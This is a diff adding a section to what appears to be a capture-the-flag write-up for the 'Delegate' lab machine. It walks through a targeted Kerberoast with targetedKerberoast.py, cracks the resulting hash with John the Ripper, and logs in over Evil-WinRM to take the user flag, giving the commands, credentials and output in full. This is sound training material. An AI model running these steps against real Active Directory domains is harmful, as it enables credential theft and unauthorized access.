@@ -273,4 +273,84 @@ This user is member of the `Remote Management Users` group, this means that if w
 
 <br />
 
-This excesive permission can be exploited in several different ways. 
+This excesive permission can be exploited in several different ways.
+
+<br />
+
+# Targeted Kerberoast
+
+<br />
+
+At this point, we proceed with a targeted kerberoast attack. This attack allows us to extract the krb5 hash of the targeted account, in this case `N.Thompson`.
+
+It can be done using the well-known [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast) tool with the following one-liner:
+
+<br />
+
+```bash
+❯ python3 targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123'
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[VERBOSE] SPN added successfully for (N.Thompson)
+[+] Printing hash for (N.Thompson)
+$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$1790a75e80fb8e9a9cb76a706310051e$b6e610e73ca5fe2942aaee50f7243a204f4a57bd5f73e5c5bf2760733042decb64998849bc0adb17251508faac5245c1878cfe14dd77b3c3004de7e23efb0ff5ebe975d84e89fcfd2397810aed011e37503dffca81dbb8ac57a7c29c2c7ccf9d4f180cb30ba9b1a349452512bc5ca628646450f7c4c0acf5425d14f37ddc8d9b944738dd597659712c94db60fc7daa9bf0d1bc446092746c69302c62b6e46fffa44b0a7b6039879691b4c832afc6d1dade163707c222bce3fdf2feb0faf10717cbba892ae01c00d01fe7c650ad2226a0df176f01689bad009ed56a085c2c77759d56faf7df2b994719f7358e3b857d3ba8185b4f2534d13f8d731cbbc43773054323dd3001c7554b1c1fb998b8085fd5ab992d1ea16a64386f3db59865714491c7bdf37285f58eb0d3cf632ef5a5f5f2c3ac656f9e83bc0261143d8b623458557eaab82ac120844bad83e68bc55ba13c254df4b3df8de1dfed24771ae3e4fe5fbad294478245c4d0956a913e311eca7881e61e66b361644ed4663d5d5dc53d6b5427ecd8d53f3ac548028b87c2ab0d489b7be5179d892d1fed14ad3f18c853d168b68250487ffd8db0688ceecb46c00151821792e02ec7b598dce1c105f7a8a62b9b8ec733960a090a1b948f79e87ccae1a2b152d37774b7f13d0b1e5016039f3f71726b9c0e2a9686f00440aacb3c247b1017d45fa6c3db1173858e400f2345df744fdc4b1f8aecb94bafcc9b2239db0f92f4ad517cbba30cc5d0e951d338e6c0823806c2b3d4f996081dce739bdb574e9a10c6bbe989284e6a36d4fdb5ddbe4b6be94395877b1a6e6e8b14713a118cc2702694858b30a7343bba46f063afb2fb93ff07fa266e7c702b9da81dc7e95174464f5ed54eb902a3c3c070a1d66d3a64933f36ff025ba1b02ae2c472a544d825acfaacbf5e56acf2cd4bd49a6f31e8ebce35c911015c988a49429704baf6c97b3c24eda18ce5269226da3db4ead1649c4c853051e538731e75fa62e2932afac336cdb9bcb172b954fca200d42fd6e70feb076dd031913186fe3e55e9d8baeaee90156b37319212b0c31f12724f7705dba5423e526d88a3bc9fd8a00ec5a03a2b6e66386447e7f26aa3b9a423912002d6e33d504b2e66692675c179893690027e127d4eba2660cdaf1247ecc9c33e4afb473e158c108742d95643a41d606134227d7287ba36412562870e19b8fe3ccb6efd46bba1c3e63035624e792f459a0f70c30b090be8be213dfdb6d1e71eb2984f4d66052b4a251f6047b66e378ce58b026fc5998bf249ac98cad4ac3e9e8d65f419b68114f0d647479d4d5645745cd441d04ee84ab444480b3b7e587cdb6a7bb0192648f180e6ee39ef6d3e9bb57efd2b7fe4a055fbea1e172f607dc8175537fae5aad182744820c10cada6494dcb203cf33bcd7baffe450f0d97781f6d281f96ed685d
+[VERBOSE] SPN removed successfully for (N.Thompson)
+```
+
+<br />
+
+The hash was really easy to crack using the JtR (John the Ripper) brute-force tool:
+
+<br />
+
+```bash
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+KALEB_2341       (?)     
+1g 0:00:00:06 DONE (2026-01-07 21:21) 0.1589g/s 1749Kp/s 1749Kc/s 1749KC/s KANEE15..KAB`12345
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+<br />
+
+Plaintext password: `KALEB_2341`
+
+This password allowed us to log in via WinRM as the `N.Thompson` user:
+
+<br />
+
+```bash
+❯ evil-winrm -i delegate.vl -u n.thompson -p 'KALEB_2341'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami
+delegate\n.thompson
+*Evil-WinRM* PS C:\Users\N.Thompson\Documents> hostname
+DC1
+```
+
+<br />
+
+The `user.txt` flag was successfully retrieved:
+
+```bash
+*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> type user.txt
+0f9d65e8478c465ded16c8f9f7xxxxxx
+```
+
+<br />
+
+# Privilege Escalation: N.Thompson -> Administrator
+
+<br />
+
